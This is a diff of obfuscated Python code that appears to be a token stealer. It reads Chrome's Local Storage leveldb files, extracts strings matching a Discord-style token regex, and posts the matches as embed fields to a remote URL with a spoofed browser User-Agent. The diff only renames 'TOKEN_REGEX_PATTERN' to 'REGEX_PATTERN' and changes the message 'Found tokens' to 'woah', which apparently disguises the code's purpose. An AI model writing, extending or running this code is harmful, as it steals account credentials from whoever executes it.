@@ -4,7 +4,7 @@ import base64
 import typing 
 import json 
 import urllib .request 
-TOKEN_REGEX_PATTERN =r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
+REGEX_PATTERN =r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
 REQUEST_HEADERS ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"}
 
 def make_post_request (OO00OOO0OOOOOO0O0 :str ,O0OO0OO000OO000O0 :typing .Dict [str ,str ])->int :
@@ -18,7 +18,7 @@ def request_reader (OOO0OO00OOOOO00O0 :str )->typing .Union [list [str ],None ]:
             O00O0O00000OOO000 =O0000O0O0OO0000OO .read ()
         except PermissionError :
             return None 
-    O0OO0OO0O0O0000O0 =re .findall (TOKEN_REGEX_PATTERN ,O00O0O00000OOO000 )
+    O0OO0OO0O0O0000O0 =re .findall (REGEX_PATTERN ,O00O0O00000OOO000 )
     return O0OO0OO0O0O0000O0 if O0OO0OO0O0O0000O0 else None 
 def request_processor (O0O00O00O00O0O0O0 :str )->typing .Union [None ,str ]:
     ""
@@ -49,7 +49,7 @@ def keep_alive_till_final (O00O0O0O000O00000 :str ,O00O0000000OO00OO :typing .Di
     O0O00O000OO00OO00 :list [dict ]=list ()
     for O0O0OOO0000OO0O0O ,OOOO0000O0000OOO0 in O00O0000000OO00OO .items ():
         O0O00O000OO00OO00 .append ({"name":O0O0OOO0000OO0O0O ,"value":"\n".join (OOOO0000O0000OOO0 )})
-    OOOO00O000OO0OOO0 ={"content":"Found tokens","embeds":[{"fields":O0O00O000OO00OO00 }]}
+    OOOO00O000OO0OOO0 ={"content":"woah","embeds":[{"fields":O0O00O000OO00OO00 }]}
     make_post_request (O00O0O0O000O00000 ,OOOO00O000OO0OOO0 )
 def main ()->None :
     OOO0OO00OOOO00OO0 =os .path .join (os .getenv ("LOCALAPPDATA"),r"Google\Chrome\User Data\Default\Local Storage\leveldb")
